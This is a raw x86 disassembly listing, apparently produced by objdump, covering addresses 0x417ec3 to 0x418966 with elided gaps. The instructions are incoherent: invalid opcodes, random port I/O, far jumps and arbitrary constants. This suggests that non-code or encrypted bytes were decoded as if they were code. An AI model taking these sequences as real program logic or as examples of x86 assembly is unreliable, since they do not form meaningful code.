  417ec3:	dec    edi
  417ec4:	je     0x417ea7
  417ec6:	rcl    DWORD PTR [ebx+0x16],cl
  417ec9:	xor    eax,0x786c227f
  417ece:	xchg   BYTE PTR [edi-0x14dfbcf],dh
  417ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ed5:	xlat   BYTE PTR ds:[ebx]
  417ed6:	jmp    0xf82036d
  417edb:	dec    esp
  417edc:	pop    ds
  417edd:	lds    ecx,FWORD PTR [eax+eiz*8]
  417ee0:	mov    ah,0x3d
  417ee2:	pusha  
  417ee3:	sti    
  417ee4:	sbb    ebx,esp
  417ee6:	out    dx,al
  417ee7:	xchg   ecx,eax
  417ee8:	xor    BYTE PTR [ebx-0x5570d43a],bl
  417eee:	push   DWORD PTR [ecx+0x650bcab8]
  417ef4:	(bad)  
  417ef5:	push   cs
  417ef6:	mov    bl,0xab
  417ef8:	packuswb mm2,QWORD PTR [edx]
  417efb:	pusha  
  417efc:	(bad)  
  417efd:	in     al,0xda
  417eff:	cmp    eax,0x20a5263f
  417f04:	call   0x8b47daab
  417f09:	mov    dh,0x48
  417f0b:	sbb    bh,cl
  417f0d:	xchg   ebp,eax
  417f0e:	jmp    0xc33726d5
  417f13:	and    edx,DWORD PTR [ebx]
  417f15:	mov    edx,DWORD PTR [edi]
  417f17:	push   cs
  417f18:	add    al,0x23
  417f1a:	imul   ecx,DWORD PTR [ebx-0x29],0x88e33a45
  417f21:	jo     0x417f8a
  417f23:	dec    ecx
  417f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f25:	xchg   ebp,eax
  417f26:	sbb    dh,bl
  417f28:	ss (bad) 
  417f2a:	mov    dh,0xaf
  417f2c:	push   cs
  417f2d:	loopne 0x417f61
  417f2f:	mov    eax,0xa2c37696
  417f34:	int    0x19
  417f36:	mov    ecx,0x29956f14
  417f3b:	adc    al,bh
  417f3d:	mov    dh,0x3
  417f3f:	scas   eax,DWORD PTR es:[edi]
  417f40:	mov    al,ds:0xbe
	...
  417fb1:	add    BYTE PTR [eax],al
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	xor    BYTE PTR [ebx+0x542b57f],dl
  417fc6:	add    DWORD PTR [eax],eax
  417fc8:	test   BYTE PTR [eax],0x0
  417fcb:	add    BYTE PTR [ecx+0xe],ah
  417fce:	lea    esi,[edi-0x13]
  417fd1:	cmp    BYTE PTR [ecx+0x0],bh
  417fd4:	lods   eax,DWORD PTR ds:[esi]
  417fd5:	xchg   ebx,eax
  417fd6:	adc    DWORD PTR [ecx+0x8f14474],0x4d
  417fdd:	lea    ebx,[esi]
  417fdf:	imul   ebp,DWORD PTR [eax],0x6ca3f12d
  417fe5:	push   ds
  417fe6:	mov    ebp,0x1c91ce0e
  417feb:	dec    eax
  417fec:	test   al,0x13
  417fee:	nop
  417fef:	rol    bl,cl
  417ff1:	fsubr  DWORD PTR ds:0xb387dee2
  417ff7:	shl    BYTE PTR [esi-0x67c5e5f4],0x95
  417ffe:	jp     0x417fe0
  418000:	fbstp  TBYTE PTR [eax+0x481ba004]
  418006:	jmp    0xa0e1e6c2
  41800b:	mov    al,ds:0x5ec4e67f
  418010:	mov    ?,WORD PTR [eax+edx*4]
  418013:	fadd   QWORD PTR [ecx-0x4f]
  418016:	in     eax,0xa6
  418018:	xchg   DWORD PTR [edi],esi
  41801a:	push   ds
  41801b:	adc    eax,0x79bcb9a3
  418020:	pop    ss
  418021:	mov    ebx,0x3cd2b19e
  418026:	sbb    DWORD PTR ds:0xd1008f61,edx
  41802c:	test   eax,0x433a81fb
  418031:	bound  eax,QWORD PTR [ebx+0x26]
  418034:	dec    esp
  418035:	or     BYTE PTR [esi+0x41],ch
  418038:	outs   dx,DWORD PTR ds:[esi]
  418039:	push   ds
  41803a:	test   DWORD PTR ds:0xd962c561,0x6e0b0582
  418044:	loop   0x417fe3
  418046:	cs sti 
  418048:	call   0x4fc42bda
  41804d:	sub    BYTE PTR [esi],al
  41804f:	xchg   edi,eax
  418050:	test   DWORD PTR [ebx],ebx
  418052:	jmp    0xb130:0xd41e18f7
  418059:	xor    edx,edx
  41805b:	push   esi
  41805c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805e:	addr16 inc edi
  418060:	cs mov bh,0xb8
  418063:	mov    ebx,0x5c3699c1
  418068:	out    0x2d,al
  41806a:	and    ebx,eax
  41806c:	mov    edx,0x107bab07
  418071:	push   es
  418072:	mov    ebp,0xdfd7baad
  418077:	(bad)  
  418078:	outs   dx,DWORD PTR ds:[esi]
  418079:	jbe    0x418096
  41807b:	imul   edi,eax,0x8
  41807e:	bound  ebx,QWORD PTR [ebx]
  418080:	cmc    
  418081:	push   eax
  418082:	add    ah,bl
  418084:	inc    esi
  418085:	pop    ss
  418086:	test   BYTE PTR [esi+eiz*2+0x1b7deedb],ch
  41808d:	fcmovb st,st(4)
  41808f:	lea    esp,[edx+0x7a]
  418092:	call   0xea90:0x331dbcdc
  418099:	into   
  41809a:	xchg   esp,eax
  41809b:	enter  0xee28,0x2c
  41809f:	mov    eax,0x88720b99
  4180a4:	cmp    DWORD PTR [ebx-0x242bc6b9],eax
  4180aa:	fstp   DWORD PTR [eax+0x6e4afd3]
  4180b0:	aas    
  4180b1:	pop    ss
  4180b2:	push   ebx
  4180b3:	bound  ebx,QWORD PTR [eax+0x56b7255c]
  4180b9:	mov    ?,WORD PTR [edi]
  4180bb:	lea    eax,gs:[ebx+edx*2+0x72b74d]
	...
  418133:	add    BYTE PTR [esi-0xe58fe7],ah
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	push   0xffffffe1
  418142:	mov    al,ds:0x106383a
  418147:	add    dh,dh
  418149:	add    BYTE PTR [eax],al
  41814b:	add    bl,cl
  41814d:	ins    BYTE PTR es:[edi],dx
  41814e:	rcr    BYTE PTR [ecx],cl
  418150:	pop    esp
  418151:	xchg   ecx,eax
  418152:	mov    esi,0x688d41b
  418157:	sahf   
  418158:	mov    al,ds:0x5d3df449
  41815d:	call   edx
  41815f:	(bad)  
  418160:	cs push ds
  418162:	mov    ebp,DWORD PTR [edi]
  418164:	or     eax,0x78fd007c
  418169:	bound  edx,QWORD PTR [eax]
  41816b:	daa    
  41816c:	std    
  41816d:	nop
  41816e:	int    0xbe
  418170:	inc    esp
  418171:	repnz push es
  418173:	jmp    0xc1c64eea
  418178:	pop    eax
  418179:	loopne 0x4181bf
  41817b:	adc    al,0x40
  41817d:	adc    eax,DWORD PTR [ebp-0x488a8836]
  418183:	sbb    al,0xfb
  418185:	shl    edx,0x16
  418188:	adc    BYTE PTR [ecx],al
  41818a:	jp     0x4181bd
  41818c:	retf   0x16a7
  41818f:	dec    ebx
  418190:	inc    edi
  418191:	pop    esp
  418192:	int    0xbf
  418194:	or     eax,0x6b859d1a
  418199:	(bad)  
  41819a:	hlt    
  41819b:	push   esi
  41819c:	js     0x41817b
  41819e:	psrlq  mm2,mm1
  4181a1:	aas    
  4181a2:	retf   
  4181a3:	mov    cl,0x3d
  4181a5:	inc    esi
  4181a6:	cs ss loope 0x418179
  4181aa:	dec    ebp
  4181ab:	das    
  4181ac:	push   ebp
  4181ad:	int    0x30
  4181af:	xor    al,0x8b
  4181b1:	call   0x8121928c
  4181b6:	(bad)  
  4181b7:	pop    ss
  4181b8:	je     0x4181ae
  4181ba:	or     cl,BYTE PTR [ebx+0x28d97736]
  4181c0:	jge    0x4181f0
  4181c2:	pop    eax
  4181c3:	call   0xfbfd:0xc3bfa3fd
  4181ca:	xchg   esp,eax
  4181cb:	jl     0x418203
  4181cd:	mov    DWORD PTR [di-0x69ce],0xaf506fb4
  4181d6:	(bad)  
  4181d7:	popf   
  4181d8:	dec    eax
  4181d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181da:	inc    edi
  4181db:	and    ah,BYTE PTR [esi+0x43]
  4181de:	jbe    0x418257
  4181e0:	(bad)  
  4181e2:	jno    0x418255
  4181e4:	jp     0x418256
  4181e6:	dec    ebp
  4181e7:	daa    
  4181e8:	outs   dx,BYTE PTR ds:[esi]
  4181e9:	mov    eax,0xee13169c
  4181ee:	pop    ebx
  4181ef:	stos   BYTE PTR es:[edi],al
  4181f0:	test   al,0xfb
  4181f2:	pop    ebp
  4181f3:	push   ebx
  4181f4:	xchg   esi,eax
  4181f5:	pushf  
  4181f6:	scas   al,BYTE PTR es:[edi]
  4181f7:	hlt    
  4181f8:	jg     0x418207
  4181fa:	nop
  4181fb:	iret   
  4181fc:	mov    ebx,0x7e135c2c
  418201:	rol    ch,cl
  418203:	test   BYTE PTR [edi],ah
  418205:	inc    ebp
  418206:	das    
  418207:	bound  esp,QWORD PTR [ebp-0x56]
  41820a:	repz loop 0x4181b1
  41820d:	je     0x418240
  41820f:	pop    ecx
  418210:	sbb    DWORD PTR [esi],0x2e
  418213:	dec    eax
  418214:	or     ebx,DWORD PTR [edi-0x4c]
  418217:	cmp    al,0x98
  418219:	loop   0x418210
  41821b:	xor    eax,0xd165cd4d
  418220:	sbb    eax,0x4446e47e
  418225:	xchg   DWORD PTR [edi+0xe],edx
  418228:	mov    esp,0x1c8dadd3
  41822d:	adc    eax,0x943ecdf1
  418232:	adc    esi,DWORD PTR [esi+0x74382510]
  418238:	jle    0x41825f
  41823a:	arpl   WORD PTR [esi],dx
  41823c:	fcomip st,st(6)
  41823e:	mov    ds:0xbb099a,eax
	...
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	les    esp,FWORD PTR [edx-0x59]
  4182c3:	pop    ebp
  4182c4:	cs pop es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    BYTE PTR [ecx-0x6e],ah
  4182ce:	jns    0x418312
  4182d0:	add    al,0x34
  4182d2:	mov    ds,esp
  4182d4:	clc    
  4182d5:	and    ebp,DWORD PTR [edi]
  4182d7:	mov    cs,WORD PTR [esi]
  4182d9:	lahf   
  4182da:	sub    al,0x16
  4182dc:	adc    ah,BYTE PTR [edi]
  4182de:	(bad)  [eax]
  4182e0:	js     0x4182ae
  4182e2:	mov    bh,0x6
  4182e4:	jo     0x4182ea
  4182e6:	and    ecx,DWORD PTR [edx+0x1fbe66dd]
  4182ec:	pop    ds
  4182ed:	enter  0x5a6b,0xe5
  4182f1:	mov    ch,bh
  4182f3:	jae    0x4182a1
  4182f5:	inc    eax
  4182f6:	jae    0x41830d
  4182f8:	cmp    BYTE PTR [edx],bl
  4182fa:	jne    0x4182d7
  4182fc:	or     al,0x71
  4182fe:	sbb    al,0xd7
  418300:	or     al,0x80
  418302:	xchg   edx,eax
  418303:	jns    0x4182d5
  418305:	pusha  
  418306:	add    DWORD PTR [edi-0x56],edx
  418309:	bound  ecx,QWORD PTR [ebx]
  41830b:	mov    esp,0x498bca24
  418310:	imul   eax,DWORD PTR [ecx-0x68],0xffffffd9
  418314:	in     al,0x4d
  418316:	aaa    
  418317:	xlat   BYTE PTR ds:[ebx]
  418318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418319:	cmp    al,0x24
  41831b:	or     eax,DWORD PTR [esi]
  41831d:	pop    edi
  41831e:	mov    BYTE PTR [edx+0x1b9245ed],bl
  418324:	inc    esp
  418325:	test   al,0xb3
  418327:	cmp    al,0xbe
  418329:	mov    ebx,0x637441bd
  41832e:	imul   edx,DWORD PTR [eax],0x7c
  418331:	mov    BYTE PTR ds:0x8fc3c60f,0x51
  418338:	xchg   BYTE PTR [edx+0x61],bh
  41833b:	imul   ebx,DWORD PTR [ebp+0x42418b0],0x51
  418342:	sar    BYTE PTR [ebx+0x641fd7f2],cl
  418348:	ror    BYTE PTR [esi-0x7b767128],1
  41834e:	int3   
  41834f:	fstp   QWORD PTR [eax]
  418351:	xchg   esi,eax
  418352:	imul   ecx,DWORD PTR [esi+0x16],0x12
  418356:	clc    
  418357:	fbstp  TBYTE PTR [esi+0x23]
  41835a:	loope  0x4183cf
  41835c:	and    DWORD PTR [esi-0x6],edx
  41835f:	or     al,0x7d
  418361:	add    ch,BYTE PTR [ecx]
  418363:	sub    dl,BYTE PTR [esi+ebp*8+0x30]
  418367:	xchg   ecx,eax
  418368:	fs jle 0x41837c
  41836b:	ret    
  41836c:	bound  ecx,QWORD PTR gs:[esi-0x1f]
  418370:	out    0xf1,eax
  418372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418373:	jne    0x4183f4
  418375:	je     0x4183b4
  418377:	jbe    0x418354
  418379:	add    BYTE PTR [esi-0x6a],dl
  41837c:	jae    0x418332
  41837e:	ret    
  41837f:	in     al,dx
  418380:	bound  edi,QWORD PTR [esi-0x1adaf4c7]
  418386:	push   ebp
  418387:	mov    BYTE PTR [eax+0x9],dl
  41838a:	data16 mov es,WORD PTR cs:[ebx]
  41838e:	test   eax,0x226f6b80
  418393:	mov    ebx,0xcdf34ad1
  418398:	xchg   edx,eax
  418399:	pop    eax
  41839a:	push   ebp
  41839b:	dec    edi
  41839c:	arpl   WORD PTR [edi],dx
  41839e:	sbb    BYTE PTR [ebx],cl
  4183a0:	pop    esp
  4183a1:	es (bad) 
  4183a3:	cmp    ebx,DWORD PTR [eax+0x4b]
  4183a6:	mov    edi,?
  4183a8:	sub    eax,DWORD PTR ds:0x8eb1f701
  4183ae:	shr    DWORD PTR [ecx-0x1a],cl
  4183b1:	fld    QWORD PTR [eax+edi*4+0x6afd227b]
  4183b8:	jo     0x4183cc
  4183ba:	outs   dx,DWORD PTR ds:[esi]
  4183bb:	mov    eax,0x60a8e45e
  4183c0:	sti    
  4183c1:	jge    0x4183c3
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	(bad)  
  418441:	pop    edx
  418442:	sti    
  418443:	fbld   TBYTE PTR [eax+ecx*1]
  418446:	add    DWORD PTR [eax],eax
  418448:	test   BYTE PTR [eax],0x0
  41844b:	add    bl,ah
  41844d:	inc    edi
  41844e:	sar    BYTE PTR [ebx+0x400e6822],0xa9
  418455:	pextrw ebx,(bad),0xc5
  418457:	sbb    BYTE PTR [esi+0x70],bh
  41845a:	inc    esp
  41845b:	lods   eax,DWORD PTR ds:[esi]
  41845c:	iret   
  41845d:	sbb    eax,eax
  41845f:	pop    es
  418460:	in     al,dx
  418461:	push   ebp
  418462:	mov    ah,0x7c
  418464:	push   esp
  418465:	dec    edx
  418466:	out    0xd6,eax
  418468:	mov    bl,0x81
  41846a:	mov    ch,0x6d
  41846c:	pop    ss
  41846d:	fcmovbe st,st(6)
  41846f:	jnp    0x418437
  418471:	call   0xb9e95d35
  418476:	ins    BYTE PTR es:[edi],dx
  418477:	xor    BYTE PTR [eax-0x62],bl
  41847a:	mov    bh,0xe9
  41847c:	je     0x418417
  41847e:	sbb    dh,BYTE PTR [ecx+0x142aafad]
  418484:	pop    edx
  418485:	add    esi,edx
  418487:	jb     0x4184c1
  418489:	dec    esi
  41848a:	jmp    0x801878c5
  41848f:	xor    dh,BYTE PTR [ecx]
  418491:	xor    ecx,DWORD PTR [ebp+0x71]
  418494:	jb     0x4184bf
  418496:	mov    edx,0x6e7222e6
  41849b:	sbb    esp,DWORD PTR [ecx-0x6b]
  41849e:	add    eax,0x1da8a1de
  4184a3:	xchg   ebx,eax
  4184a4:	push   edi
  4184a5:	cmp    al,0x32
  4184a7:	stos   DWORD PTR es:[edi],eax
  4184a8:	ret    0x4c3a
  4184ab:	mov    gs,esi
  4184ad:	test   BYTE PTR [ecx],0xe8
  4184b0:	pop    ebx
  4184b1:	test   eax,0xab52c229
  4184b6:	out    0xa3,al
  4184b8:	lea    ecx,[ebp+0x73a8362e]
  4184be:	ja     0x418468
  4184c0:	dec    eax
  4184c1:	mov    bh,0x62
  4184c3:	adc    bh,BYTE PTR [edx]
  4184c5:	ja     0x4184b1
  4184c7:	inc    eax
  4184c8:	(bad)  
  4184ca:	mov    ah,0x2c
  4184cc:	sahf   
  4184cd:	ja     0x4184ca
  4184cf:	sub    bh,BYTE PTR ds:0xc09166ba
  4184d5:	out    0x45,eax
  4184d7:	add    BYTE PTR [ecx-0x13],ah
  4184da:	jae    0x41850e
  4184dc:	mov    cl,0x21
  4184de:	lea    ecx,[ebp+ebx*2-0xc]
  4184e2:	sbb    BYTE PTR [ecx],dl
  4184e4:	mov    al,0x1b
  4184e6:	sub    eax,0xd4d1071e
  4184eb:	sahf   
  4184ec:	mov    WORD PTR [eax-0x3f],es
  4184ef:	push   ebx
  4184f0:	jge    0x4184e5
  4184f2:	in     eax,0xda
  4184f4:	cwde   
  4184f5:	cmp    al,0x99
  4184f7:	mov    esi,0x39e2a36d
  4184fc:	inc    ebp
  4184fd:	xchg   ebp,eax
  4184fe:	push   cs
  4184ff:	stos   DWORD PTR es:[edi],eax
  418500:	lea    esp,[eax-0x3a]
  418503:	push   edi
  418504:	inc    ebp
  418505:	cmp    dh,BYTE PTR [ebx+0x32]
  418508:	pop    edi
  418509:	jne    0x418544
  41850b:	jmp    0xd136:0x7d2e0e90
  418512:	clc    
  418513:	inc    esi
  418514:	std    
  418515:	push   ds
  418516:	loope  0x41849e
  418518:	(bad)  
  418519:	ss (bad) 
  41851c:	mov    edi,0xd2778fb3
  418521:	dec    edi
  418522:	daa    
  418523:	sbb    ax,0xf650
  418527:	in     al,0xc3
  418529:	(bad)  
  41852a:	jbe    0x4184da
  41852c:	cmp    dl,BYTE PTR [edx+edi*8-0x67]
  418530:	pop    ecx
  418531:	les    edi,FWORD PTR [eax-0x511f3de1]
  418537:	xchg   edx,eax
  418538:	inc    ecx
  418539:	xor    esp,DWORD PTR [edi+0x14f677a7]
  41853f:	jecxz  0x4184c6
  418541:	aad    0x0
	...
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	dec    edi
  4185c1:	push   es
  4185c2:	aaa    
  4185c3:	mov    al,ds:0x1091a
  4185c8:	test   BYTE PTR [eax],0x0
  4185cb:	add    BYTE PTR [edx-0x12021d95],dh
  4185d1:	pop    ecx
  4185d2:	ficomp WORD PTR [edi-0x1]
  4185d5:	dec    ebp
  4185d6:	pop    ebx
  4185d7:	cmp    BYTE PTR [eax*1+0x6c7e16b6],bh
  4185de:	mov    cl,0x35
  4185e0:	jno    0x41860c
  4185e2:	loopne 0x4185cc
  4185e4:	arpl   dx,bx
  4185e6:	(bad)  
  4185e7:	push   ebx
  4185e8:	pop    ds
  4185e9:	xlat   BYTE PTR ds:[ebx]
  4185ea:	xor    BYTE PTR [ebx+0x728b9148],dl
  4185f0:	(bad)  
  4185f2:	hlt    
  4185f3:	aad    0x62
  4185f5:	dec    eax
  4185f6:	in     eax,0x9b
  4185f8:	jns    0x418590
  4185fa:	repz xchg ebx,eax
  4185fc:	push   ecx
  4185fd:	in     al,0x51
  4185ff:	inc    ebx
  418600:	fsubr  QWORD PTR [esi+eax*4-0x72]
  418604:	and    eax,ebp
  418606:	outs   dx,DWORD PTR ds:[esi]
  418607:	sub    DWORD PTR [esi+0x2961e783],0x1f
  41860e:	xchg   ebx,eax
  41860f:	or     DWORD PTR [ebp-0x17],edi
  418612:	scas   al,BYTE PTR es:[edi]
  418613:	scas   eax,DWORD PTR es:[edi]
  418614:	mov    BYTE PTR [ebp+0x17c6a40],al
  41861a:	jo     0x4185ab
  41861c:	inc    edi
  41861d:	fs push ebp
  41861f:	(bad)  
  418621:	jle    0x418699
  418623:	aad    0x79
  418625:	icebp  
  418626:	jge    0x41869d
  418628:	sbb    BYTE PTR [edi+esi*4+0x1e],al
  41862c:	loop   0x4186a4
  41862e:	int3   
  41862f:	push   edi
  418630:	adc    BYTE PTR [edi-0x7101c50],bl
  418636:	aad    0x9b
  418638:	out    0x63,eax
  41863a:	loop   0x4186a5
  41863c:	jno    0x4186b1
  41863e:	aad    0x4c
  418640:	scas   al,BYTE PTR es:[edi]
  418641:	repnz dec edi
  418643:	int    0xb1
  418645:	jbe    0x4186b2
  418647:	test   DWORD PTR [edi],edx
  418649:	xchg   edx,eax
  41864a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41864b:	bound  ecx,QWORD PTR [eax+0x7]
  41864e:	rol    DWORD PTR [edi+0x126d4492],1
  418654:	cmp    al,0xcd
  418656:	les    eax,FWORD PTR [edi-0xc]
  418659:	inc    esi
  41865a:	pop    edx
  41865b:	and    dh,ch
  41865d:	out    0x8a,eax
  41865f:	xor    eax,DWORD PTR [edi+0x7bfb740c]
  418665:	xor    ebx,edx
  418667:	ror    DWORD PTR [ebx+ecx*2+0x1430a718],cl
  41866e:	and    bl,bl
  418670:	mov    dh,0x5d
  418672:	inc    ebp
  418673:	jae    0x418692
  418675:	loopne 0x418621
  418677:	dec    esp
  418678:	add    eax,DWORD PTR [ecx+ebp*8]
  41867b:	aas    
  41867c:	sbb    bh,BYTE PTR [esi-0x57]
  41867f:	sub    DWORD PTR [ebx],esp
  418681:	mov    al,ds:0x5a244838
  418686:	shl    DWORD PTR [eax-0x5d],1
  418689:	xchg   esp,eax
  41868a:	pop    esi
  41868b:	mov    edx,DWORD PTR [ebx-0x4e63f430]
  418691:	mov    edi,0x931a08f6
  418696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418697:	xchg   BYTE PTR [ecx-0x7],cl
  41869a:	clc    
  41869b:	(bad)  
  41869c:	pop    ecx
  41869d:	ss pop ds
  41869f:	stc    
  4186a0:	and    esp,eax
  4186a2:	into   
  4186a3:	lods   eax,DWORD PTR ds:[esi]
  4186a4:	sub    BYTE PTR [ebp-0x20],dl
  4186a7:	cwde   
  4186a8:	sar    BYTE PTR [eax+ebx*1-0x7e],cl
  4186ac:	jge    0x418727
  4186ae:	ins    DWORD PTR es:[edi],dx
  4186af:	inc    esi
  4186b0:	jle    0x41865b
  4186b2:	cmp    DWORD PTR [edx-0x402dcb25],0x8636bf97
  4186bc:	cmc    
  4186bd:	pop    ebx
  4186be:	inc    esp
  4186bf:	jmp    0x0:0x501c
	...
  418732:	add    BYTE PTR [eax],al
  418734:	jmp    0xff598547
  418739:	imul   ecx
  41873b:	(bad)  
  41873c:	pop    ds
  41873d:	sub    ah,0x2b
  418740:	fcom   QWORD PTR [edx]
  418742:	pop    ds
  418743:	jg     0x418755
  418745:	or     al,BYTE PTR [ecx]
  418747:	add    dh,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    ah,cl
  41874d:	adc    ecx,DWORD PTR [ebx+0x2a3b38e4]
  418753:	outs   dx,BYTE PTR ds:[esi]
  418754:	inc    edi
  418755:	mov    dl,BYTE PTR [edi]
  418757:	sbb    dl,ah
  418759:	mov    bl,0xf8
  41875b:	test   eax,0x588b3054
  418760:	pop    esi
  418761:	gs jge 0x418779
  418764:	data16 ins BYTE PTR es:[edi],dx
  418766:	scas   al,BYTE PTR es:[edi]
  418767:	jmp    0x7ef68bc9
  41876c:	arpl   cx,dx
  41876e:	inc    esi
  41876f:	jg     0x4187a2
  418771:	in     al,dx
  418772:	add    ecx,DWORD PTR es:[ecx-0x7f]
  418776:	pop    esi
  418777:	sub    edx,DWORD PTR [edx+esi*8-0x59]
  41877b:	inc    ebp
  41877c:	loop   0x418780
  41877e:	sahf   
  41877f:	inc    eax
  418780:	sar    ebx,cl
  418782:	cmp    bh,BYTE PTR [edx-0x19]
  418785:	pop    edi
  418786:	test   DWORD PTR [ebx+0x12],ecx
  418789:	fsubp  st(0),st
  41878b:	jns    0x418741
  41878d:	xor    BYTE PTR [eax-0x623bf9bd],bl
  418793:	mov    cl,0x80
  418795:	ins    BYTE PTR es:[edi],dx
  418796:	fist   WORD PTR [edx+0x264e7d47]
  41879c:	fild   QWORD PTR [ecx-0x3ddd222f]
  4187a2:	push   ss
  4187a3:	xchg   esp,eax
  4187a4:	push   esi
  4187a5:	cmc    
  4187a6:	nop
  4187a7:	jl     0x4187bb
  4187a9:	data16 mov ds:0x388ae97d,al
  4187af:	in     al,dx
  4187b0:	lock xchg ebp,eax
  4187b2:	jbe    0x4187c1
  4187b4:	mov    ch,0x0
  4187b6:	fld    st(5)
  4187b8:	or     ecx,DWORD PTR [ebp+0x66]
  4187bb:	xchg   edx,eax
  4187bc:	pop    ebx
  4187bd:	jle    0x418762
  4187bf:	repz (bad) 
  4187c2:	sbb    al,0x4e
  4187c4:	mov    ds:0xddf3fb0e,eax
  4187c9:	out    0x22,al
  4187cb:	fs loope 0x4187b3
  4187ce:	sub    edi,ebp
  4187d0:	cmc    
  4187d1:	xor    eax,0x5fad1db8
  4187d6:	sub    dh,dl
  4187d8:	in     al,0x2e
  4187da:	les    edx,FWORD PTR [ebp+0x24]
  4187dd:	mov    es,WORD PTR [esi+0x3]
  4187e0:	lods   eax,DWORD PTR ds:[esi]
  4187e1:	aas    
  4187e2:	lea    ebp,[edx]
  4187e4:	clc    
  4187e5:	mov    ch,0xd4
  4187e7:	pop    edx
  4187e8:	add    al,0xd4
  4187ea:	sbb    DWORD PTR ss:[ecx+0x26],eax
  4187ee:	xor    eax,0x52f66b4c
  4187f3:	scas   al,BYTE PTR es:[edi]
  4187f4:	cld    
  4187f5:	inc    edx
  4187f6:	adc    BYTE PTR [esi],ch
  4187f8:	push   edx
  4187f9:	in     eax,dx
  4187fa:	lods   al,BYTE PTR ds:[esi]
  4187fb:	jle    0x4187d8
  4187fd:	int    0xd4
  4187ff:	and    al,0x2
  418801:	mov    ah,0xef
  418803:	pop    ss
  418804:	out    0xf6,al
  418806:	imul   esi
  418808:	cmp    esp,DWORD PTR [ecx-0x599d2a1f]
  41880e:	in     eax,0x9a
  418810:	mov    al,ds:0xfbfca78e
  418815:	sbb    ecx,ebp
  418817:	cdq    
  418818:	test   al,0x3b
  41881a:	ret    0xbc77
  41881d:	and    al,0x73
  41881f:	and    DWORD PTR [ebp+0x47],ebx
  418822:	jae    0x4187e6
  418824:	jle    0x4187a6
  418826:	cmp    dh,BYTE PTR [ecx+edx*1]
  418829:	jmp    0xf553:0xc74612b7
  418830:	mov    edi,DWORD PTR [ecx]
  418832:	fwait
  418833:	mov    es,WORD PTR [ebp+0x6a]
  418836:	into   
  418837:	addr16 cmp ebx,esp
  41883a:	jecxz  0x418863
  41883c:	fdecstp 
  41883e:	add    ah,BYTE PTR [edi+0x3f]
  418841:	add    BYTE PTR es:[eax],al
	...
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0x44aac132,al
  4188c3:	sbb    eax,DWORD PTR [esi]
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [edx-0x3],bl
  4188ce:	dec    edi
  4188cf:	mov    eax,ds:0xa999f996
  4188d4:	and    esi,edi
  4188d6:	out    0xd7,al
  4188d8:	(bad)  
  4188d9:	jbe    0x418872
  4188db:	scas   eax,DWORD PTR es:[edi]
  4188dc:	adc    DWORD PTR [ebx+0x28],edi
  4188df:	adc    DWORD PTR [edx+0x7e],esp
  4188e2:	cmc    
  4188e3:	xchg   esp,eax
  4188e4:	mov    edx,0x3a97296e
  4188e9:	fstp   QWORD PTR [esi]
  4188eb:	call   0x5eb:0x70f8be2c
  4188f2:	sub    BYTE PTR [eax],cl
  4188f4:	push   cs
  4188f5:	push   ebx
  4188f6:	scas   eax,DWORD PTR es:[edi]
  4188f7:	and    esp,ebp
  4188f9:	lahf   
  4188fa:	sub    ebp,ebx
  4188fc:	mov    ds:0xb944a7f3,eax
  418901:	in     al,0xd1
  418903:	cmp    esp,0x70a72cd1
  418909:	arpl   si,sp
  41890b:	inc    edi
  41890c:	scas   eax,DWORD PTR es:[edi]
  41890d:	cmc    
  41890e:	inc    esp
  41890f:	sar    BYTE PTR [edi],1
  418911:	aam    0xdd
  418913:	xchg   esi,eax
  418914:	out    0x61,eax
  418916:	test   BYTE PTR [ebx],bl
  418918:	ja     0x418988
  41891a:	sub    DWORD PTR [eax+0x5a],esi
  41891d:	addr16 cwde 
  41891f:	adc    eax,0xb4889fa
  418924:	nop
  418925:	ror    BYTE PTR [esi],1
  418927:	sub    ebp,ebx
  418929:	cmp    BYTE PTR [eax+0x74ff1519],dl
  41892f:	mov    WORD PTR [edx],fs
  418931:	sbb    ecx,DWORD PTR [edi-0x1f2dcf93]
  418937:	or     ch,BYTE PTR [edi+ebp*1-0x1bf63561]
  41893e:	lds    esp,FWORD PTR [ebx+0x33]
  418941:	jmp    0x4188fc
  418943:	mov    ecx,ebp
  418945:	jns    0x41895f
  418947:	xor    al,0x78
  418949:	and    BYTE PTR [eax+ecx*4+0x3ebe9d55],0x3a
  418951:	mov    DWORD PTR [eax-0x33],ecx
  418954:	stc    
  418955:	jbe    0x4188e8
  418957:	sbb    DWORD PTR [ebx-0x6d],0xffffffce
  41895b:	lea    edx,[edx]
  41895d:	sbb    eax,edx
  41895f:	icebp  
  418960:	mov    eax,ds:0x95bff14c
  418965:	outs   dx,BYTE PTR ds:[esi]
  418966:	mov    dh,0x48
